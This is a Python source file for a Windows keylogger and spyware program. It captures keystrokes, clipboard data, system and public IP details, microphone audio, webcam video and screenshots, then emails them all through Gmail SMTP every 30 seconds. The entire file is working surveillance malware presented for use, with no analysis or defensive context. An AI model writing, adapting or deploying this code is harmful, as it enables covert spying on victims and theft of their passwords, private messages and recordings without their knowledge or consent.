#modules for sending email 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import threading
#library for getting machine related info
import platform

#library for sending requests
import urllib.request

#library for getting clipboard info
import win32clipboard

#library for creating an audio file
from scipy.io.wavfile import write
import sounddevice as sd

#library for taking screenshots
from multiprocessing import Process, freeze_support
import pyautogui

import time

##library for capturing video
import cv2

##library for listening for key strokes
from pynput.keyboard import Key,Listener

#below files are created and sent trough mail
key_logger_file     = "keylog.txt"
f= open(key_logger_file,'w')
f.close()
system_info_file    = "system_information.txt"
clipboard_file      = "clipboard.txt"
audio_file          = "audio.wav" 
screenshot          = "screenshot.png"
video_file          =  "video.mp4"  


# filepath            = "C:"        can specify any path where the above files should be created
filepath=""
myScreenshot=1


###Below function takes mail attachments as arguments and will send mail
def send_mail(file,attachments):
    fromaddr= "test@test.com"   #enter from address here
    msg=MIMEMultipart()
    msg['From']= fromaddr
    msg['To']= fromaddr         #enter to address here
    msg['Subject']= "keylogger files"
    body= "Have look at the latest files send by keylogger"
    msg.attach(MIMEText(body,'plain'))

    attachments= open(attachments, 'rb')
    #adding attachments
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachments).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % file)
    msg.attach(p)
    #setting up socket
    socket= smtplib.SMTP('smtp.gmail.com',587)
    socket.starttls()
    #Enter credentials for your mail for sending mails through smtp protocol over sockets
    socket.login("test@test.com","password")
    text= msg.as_string()
    #1sr argument shhould be from address and 2nd argument should be to address
    socket.sendmail(fromaddr,fromaddr,text)
    socket.quit()

#Below function is called when a keys are pressed
def writetofile(k):
    #formatting the key which we got through listener
    k= str(k)
    k=k.replace("'","")   
    if k=='Key.space':
        k=' '
    elif k=='Key.shift_r':
        k=''
    elif k=='Key.enter':
        k='\n'
    #writing key into file
    with open(filepath+key_logger_file,'a+') as f:
        f.write(k)

#Below function fetches system info 
def get_system_info():
    print("Getting system info...")
    with open(filepath+system_info_file,'w') as f:
        user = socket.gethostname()
        IP_address= socket.gethostbyname(user)
        #For getting Public ip address below link is used 
        public_ip= urllib.request.urlopen('https://ident.me').read().decode('utf8')
        f.write(user+"\n"+"My Public ip is "+public_ip+"\n")
        f.write("Processor: "+(platform.processor())+ '\n')
        f.write("System info: " + platform.system() + " " + platform.version() + '\n' )
        f.write("Machine: " + platform.machine()+'\n')
        f.write("hostname: "+ user +'\n')
        f.write("private Ip address is "+ IP_address)

#Below function gets clipboard info
def get_clipboard():
    print("Copying clipboard info...")
    with open(filepath+clipboard_file, 'w') as f :
        try :
            win32clipboard.OpenClipboard()
            data=win32clipboard.GetClipboardData()
            f.write("Clipboard data : \n\t"+data+'\n')
        except:
            f.write("Error: unable to copy clipboard data")
    
#Below function create a audio file with length as specified
def get_audio():
    print("Creating audio file...")
    sample_freq= 44100
    time= 3  #length of audio file
    record = sd.rec(int(time * sample_freq), samplerate=sample_freq,channels=2 )
    sd.wait()
    write(filepath+audio_file,sample_freq,record)


#Below function create a video file
#length of video file is depends on the while loop we run 
#in the ebelow function for each second we are creating 20 frames while runs for 100 frames 
#so video length will be 5 sec
def get_video():
    print("Capturing vedio...")
    global video_file
    try:
        vid_cap = cv2.VideoCapture(0,cv2.CAP_DSHOW)
        fourcc_code=cv2.VideoWriter_fourcc(*'mp4v')
        video_output = cv2.VideoWriter(video_file,fourcc_code,20.0,(640,480))
        count=0
        while(count<101):
            ret,frame= vid_cap.read()
            video_output.write(frame)
            count+=1
        vid_cap.release()
        video_output.release()
        cv2.destroyAllWindows()
    except Exception:
        video_file= "video_output.txt"
        with open(video_file ,'w') as f:
            f.write("unable to capture video")


def  get_screenshot():
    print("Taking screenshot...")
    global myScreenshot
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(filepath+screenshot)

def release(k):
    if k==Key.esc:
        return False 

def send_report():
    print("SENDNG FILES.................")
    print("Sending keylogs")
    send_mail(key_logger_file,filepath+key_logger_file)
    print("Sending system info")
    send_mail(system_info_file,filepath+system_info_file)
    print("Sending clipboard info")
    send_mail(clipboard_file,filepath+clipboard_file)
    print("Sending screenshot")
    send_mail(screenshot,filepath+screenshot)
    print("Sending audio file")
    send_mail(audio_file,filepath+audio_file)
    print("Sending video file")
    send_mail(video_file,filepath+video_file)
    time.sleep(5)
    #again calling al functions for getting new files such as new screenshot etc
    get_video()
    get_audio()
    get_screenshot()
    get_system_info()
    get_clipboard()
    #for every 30sec this code ir runned
    timer=threading.Timer(30,send_report)
    timer.start()

#keyboard event listener
keyboard_listener = Listener(on_press=writetofile,on_release= release)

with keyboard_listener:
    get_audio()
    get_screenshot()
    get_system_info()
    get_clipboard()
    get_video()
    time.sleep(3)
    send_report()
    keyboard_listener.join()
    